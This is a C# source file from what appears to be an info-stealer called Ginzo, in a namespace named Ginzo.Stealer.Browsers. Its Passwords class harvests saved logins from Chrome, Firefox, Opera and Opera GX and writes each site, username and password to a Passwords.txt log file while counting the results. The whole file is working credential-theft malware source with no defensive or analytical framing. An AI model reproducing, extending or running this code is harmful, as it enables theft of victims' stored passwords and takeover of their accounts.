using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Ginzo;
using Ginzo.Grabbers;

namespace Ginzo.Stealer.Browsers
{
    internal class Passwords
    {
        public static int ChromePasswordsCount = 0;
        public static int FirefoxPasswordsCount = 0;
        public static int OperaPasswordsCount = 0;
        public static int OperaGXPasswordsCount = 0;
        public static void Chrome()
        {
            try
            {
                ChromeGrabber grabber = new ChromeGrabber();
                List<Chromium.Login> logins = (List<Chromium.Login>)grabber.GetLogins();
                foreach (Chromium.Login login in logins)
                {
                    if (login.UsernameValue.Length > 1)
                    {
                        string cookieline = String.Format("HOSTNAME: {0}\nLOGIN: {1}\nPASSWORD: {2}\nBROWSER: Google Chrome\n\n", login.OriginUrl, login.UsernameValue, login.PasswordValue);
                        File.AppendAllText(Preparing.LogPath + "\\Passwords.txt", cookieline);
                        ChromePasswordsCount++;
                    }
                }
                Console.WriteLine("Chrome passwords: " + ChromePasswordsCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Chrome browser passwords");
            }
        }

        public static void Firefox()
        {
            try
            {
                FirefoxGrabber grabber = new FirefoxGrabber();
                List<Firefox.Login> logins = (List<Firefox.Login>)grabber.GetLogins();
                foreach (Firefox.Login login in logins)
                {
                    if (login.EncryptedUsername.Length > 1)
                    {
                        string cookieline = String.Format("HOSTNAME: {0}\nLOGIN: {1}\nPASSWORD: {2}\nBROWSER: Firefox\n\n", login.Hostname, login.EncryptedUsername, login.EncryptedPassword);
                        File.AppendAllText(Preparing.LogPath + "\\Passwords.txt", cookieline);
                        FirefoxPasswordsCount++;
                    }
                }
                Console.WriteLine("Firefox passwords: " + FirefoxPasswordsCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Firefox browser passwords");
            }
        }

        public static void Opera()
        {
            try
            {
                OperaGrabber grabber = new OperaGrabber();
                List<Chromium.Login> logins = (List<Chromium.Login>)grabber.GetLogins();
                foreach (Chromium.Login login in logins)
                {
                    if (login.UsernameValue.Length > 1)
                    {
                        string cookieline = String.Format("HOSTNAME: {0}\nLOGIN: {1}\nPASSWORD: {2}\nBROWSER: Opera Standart\n\n", login.OriginUrl, login.UsernameValue, login.PasswordValue);
                        File.AppendAllText(Preparing.LogPath + "\\Passwords.txt", cookieline);
                        OperaPasswordsCount++;
                    }
                }
                Console.WriteLine("Opera passwords: " + OperaPasswordsCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Opera browser passwords");
            }
        }

        public static void OperaGX()
        {
            try
            {
                OperaGxGrabber grabber = new OperaGxGrabber();
                List<Chromium.Login> logins = (List<Chromium.Login>)grabber.GetLogins();
                foreach (Chromium.Login login in logins)
                {
                    if (login.UsernameValue.Length > 1)
                    {
                        string cookieline = String.Format("HOSTNAME: {0}\nLOGIN: {1}\nPASSWORD: {2}\nBROWSER: Opera GX\n\n", login.OriginUrl, login.UsernameValue, login.PasswordValue);
                        File.AppendAllText(Preparing.LogPath + "\\Passwords.txt", cookieline);
                        OperaGXPasswordsCount++;
                    }
                }
                Console.WriteLine("Opera GX passwords: " + OperaGXPasswordsCount);
            }
            catch
            {
                Console.WriteLine("Error when getting Opera GX browser passwords");
            }
        }
        public static int GetPasswordsCount()
        {
            int allpasswords = ChromePasswordsCount + FirefoxPasswordsCount + OperaPasswordsCount + OperaGXPasswordsCount;
            return allpasswords;
        }
    }
}
